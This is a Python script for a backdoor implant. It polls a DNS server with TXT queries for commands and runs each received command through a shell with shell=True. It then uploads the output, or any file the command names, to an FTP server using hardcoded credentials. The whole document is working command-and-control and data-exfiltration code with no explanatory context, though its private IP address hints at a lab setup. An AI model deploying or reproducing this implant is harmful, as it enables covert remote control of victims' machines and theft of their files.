#!/usr/bin/env python

import struct
import socket
import random
import subprocess
import os.path
import time
from ftplib import FTP

DNS_IP = "192.168.56.102"
DNS_PORT = 53
FTP_IP = "192.168.56.102"
FTP_PORT = 21
OUTPUT_FILE = "res.txt"

def build_packet(url):
    packet = struct.pack(">H", random.randint(0, 65535))  # Query Id
    packet += struct.pack(">H", 256)  # Flags
    packet += struct.pack(">H", 1)  # Questions
    packet += struct.pack(">H", 0)  # Answers
    packet += struct.pack(">H", 0)  # Authorities
    packet += struct.pack(">H", 0)  # Additional
    split_url = url.split(".")
    for part in split_url:
        packet += struct.pack("B", len(part))
        for byte in bytes(part):
            packet += struct.pack("c", byte)
    packet += struct.pack("B", 0)  # End of String
    packet += struct.pack(">H", 16)  # Query Type (TXT)
    packet += struct.pack(">H", 1)  # Query Class (IN)
    return packet

def upload_file(filename_local, filename_remote):
    ftp = FTP()
    ftp.connect(FTP_IP, FTP_PORT)
    ftp.login('lucas', '123qwe')
    file = open(filename_local, 'rb')
    ftp.storbinary('STOR '+filename_remote, file)
    ftp.quit()
    file.close()

domain = "order0.mydomain.com"

while(1):
    # Send the packet
    packet = build_packet(domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 8888))
    sock.settimeout(2)
    sock.sendto(bytes(packet), (DNS_IP, DNS_PORT))
    print("Packet Sent")

    # Get response
    data, addr = sock.recvfrom(512)

    #print("Response: " + data)
    rname = data[36:38]
    rtype = data[38:40]
    rclass = data[40:42]
    rttl = data[42:46]
    rdlength = data[46:48]
    txtlength = data[49]
    txt = data[50:(50+ord(txtlength))]
    command = txt.split(';')    #split the command on the first index and the number to the next order on the second
    domain = "order" + command[1] + ".mydomain.com"

    # Run command
    print command[0]
    if (os.path.isfile(command[0])):
        # if it's a file, send it
        print "uploading file"
        upload_file(command[0], os.path.basename(command[0]))
    else:
        # otherwise, run command and send result
        try:
            res = subprocess.check_output(command[0], shell=True)
        except subprocess.CalledProcessError as e:
            res = e.output
        file = open(OUTPUT_FILE, 'w')
        file.write(res)
        file.close()
        print "uploading result"
        upload_file(OUTPUT_FILE, str(time.time()) + '.txt')
        os.remove(OUTPUT_FILE)

    #break condition
    if(command[1] == "-1"):
        break

    sock.close()
